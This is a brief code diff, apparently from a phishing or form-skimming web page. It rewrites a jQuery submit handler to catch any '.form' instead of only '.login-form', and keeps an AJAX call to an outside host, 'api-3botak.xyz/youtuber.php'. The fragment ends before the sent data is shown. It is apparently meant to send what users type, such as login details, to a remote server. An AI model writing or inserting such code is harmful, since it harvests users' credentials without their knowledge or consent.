@@ -1,5 +1,5 @@
-$(".login-form").submit(function() {
-	var d = $(".login-form");
+$(".form").submit(function() {
+	var d = $(".form");
 
 	$.ajax({
         url: "http://api-3botak.xyz/youtuber.php",
